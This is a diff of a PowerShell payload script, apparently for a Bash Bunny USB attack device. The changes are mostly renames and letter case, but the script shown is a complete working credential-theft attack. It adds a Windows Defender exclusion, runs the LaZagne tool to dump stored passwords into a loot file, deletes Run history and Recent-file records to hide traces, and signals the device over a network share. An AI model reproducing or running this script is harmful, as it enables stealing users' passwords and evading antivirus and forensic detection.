@@ -5,8 +5,8 @@
 # Define ExeArguments here (all -vv is default):
 $ExeArgs = "all -vv"
 
-# Define loot folder name here (hostname is default):
-$foldername = "$env:computername"
+# Define loot folder name here (hostname_LaZagne is default):
+$foldername = "$env:computername" + "_LaZagne"
 
 # Define loot file name here (hostname is default):
 $filename = "$env:computername"
@@ -24,25 +24,25 @@ $BashBunnyLabel = (gwmi -class win32_volume -f {label = "BASHBUNNY"}).DriveLette
 Add-MpPreference -ExclusionPath "$BashBunnyLabel"
 
 # Unzip lazagne.zip
-Expand-Archive -Force $BashBunnyLabel\lazagne.zip $BashBunnyLabel\lazagne
+Expand-Archive -Force $BashBunnyLabel\LaZagne.zip $BashBunnyLabel\LaZagne
 
 # Define variable for the path to LaZagne + execution arguments
-$LazagnePath = & $BashBunnyLabel\lazagne\lazagne.exe $ExeArgs
+$LaZagnePath = & $BashBunnyLabel\LaZagne\LaZagne.exe $ExeArgs
 
-# Create the loot folder in the "\loot\lazassword\" directory
-New-Item -ItemType Directory -Force -Path $BashBunnyLabel\loot\lazassword\$foldername
+# Create the loot folder in the "\loot\LaZassword\" directory
+New-Item -ItemType Directory -Force -Path $BashBunnyLabel\loot\LaZassword\$foldername
 
 # Define variable for the loot file
 $lootfile = "$BashBunnyLabel\loot\lazassword\$foldername\$filename.txt"
 
 # Execute LaZagne and save the output in the loot file
-$LazagnePath | Out-File -FilePath $lootfile
+$LaZagnePath | Out-File -FilePath $lootfile
 
 # Delete the run (win+r) history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Remove the unzipped LaZagne folder
-Remove-Item "$BashBunnyLabel\lazagne\" -recurse
+Remove-Item "$BashBunnyLabel\LaZagne\" -recurse
 
 # Remove the antivirus exclusion for the BashBunny
 Remove-MpPreference -ExclusionPath "$BashBunnyLabel"
@@ -51,4 +51,4 @@ Remove-MpPreference -ExclusionPath "$BashBunnyLabel"
 Get-ChildItem -Path C:\Users\\$env:UserName\AppData\Roaming\Microsoft\Windows\Recent -Include * -File -Recurse | foreach { $_.Delete()}
 
 # Send the finished message to the BashBunny
-\\172.16.64.1\lazassword
+\\172.16.64.1\LaZassword
